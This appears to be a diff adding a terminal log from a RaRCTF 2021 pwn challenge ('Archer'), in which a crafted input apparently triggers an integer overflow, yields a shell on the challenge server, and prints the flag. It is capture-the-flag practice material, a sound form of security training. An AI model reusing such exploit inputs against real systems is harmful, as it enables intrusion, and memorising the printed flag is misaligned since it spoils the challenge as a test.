@@ -1,0 +1,19 @@
+mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_Archer_100$ nc 193.57.159.27 49723
+It's battle day archer! Have you got what it takes?
+Answer [yes/no]: yes
+Awesome! Make your shot.
+Here's your arrow!
+Now, which soldier do you wish to shoot?
+FFFFFFFFFFF04068
+Shot!
+Hope you shot well! This will decide the battle.
+WE WON!
+id
+uid=1000(tango) gid=1000(tango) groups=1000(tango)
+ls -l
+total 24
+-rwxr-x---. 1 root tango 16936 Aug  2 20:18 archer
+-rwxr-x---. 1 root tango    55 Aug  2 20:18 flag_0a52f21b1a.txt
+cat flag_0a52f21b1a.txt
+rarctf{sw33t_sh0t!_1nt3g3r_0v3rfl0w_r0cks!_170b2820c9}
+
